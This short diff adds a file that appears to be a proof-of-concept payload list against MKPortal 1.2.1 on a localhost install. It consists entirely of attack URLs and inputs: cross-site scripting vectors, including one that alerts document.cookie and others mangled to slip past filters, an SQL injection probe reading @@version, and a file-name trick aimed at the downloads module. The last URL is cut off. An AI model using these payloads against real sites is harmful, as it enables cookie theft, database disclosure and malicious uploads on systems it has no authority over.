@@ -1,0 +1,16 @@
+http://localhost/mkportal.1.2.1/?ind[]
+
+&lt;marquee loop=1 onfinish=alert(document.cookie) width=0&gt;&lt;/marquee&gt;
+
+&lt;body ononsubmitload=aleonsubmitrt(123);&gt;
+&lt;salertcript&gt;aalertlert(123);&lt;/salertcript&gt;
+
+http://localhost/mkportal.1.2.1/mkportal/modules/rss/handler_image.php
+?i=&lt;script&gt;alert(123);&lt;/script&gt;
+
+http://localhost/mkportal.1.2.1/index.php?ind=blog&amp;op=edit_template&#039;,template=@@version,template2=&#039;
+
+http://localhost/mkportal.1.2.1/index.php?ind=downloads&amp;op=download_file&amp;ide=3
+&amp;file=test.Php.zzz
+
+http://localhost/mkportal.1.2.1/index.php?ind=blog&amp;op=p_gal
